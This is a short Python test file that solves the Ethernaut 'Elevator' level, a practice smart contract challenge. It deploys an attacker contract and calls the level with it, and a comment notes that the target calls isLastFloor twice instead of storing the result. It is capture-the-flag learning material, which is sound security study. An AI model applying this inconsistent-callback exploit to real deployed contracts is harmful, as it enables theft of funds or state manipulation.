from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv11_elevator import Elevator
from pytypes.contracts.attacker.lv11_building import BuildingImpl

@default_chain.connect()
def test_lv11():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv11()
    exploit_lv11(contract)
    ethernaut.check_lv11(contract)

def exploit_lv11(contract: Elevator):
    # Attack vector: function isLastFloor is called twice instead of saving its value
    building = BuildingImpl.deploy()
    building.goToWith(13, contract.address)
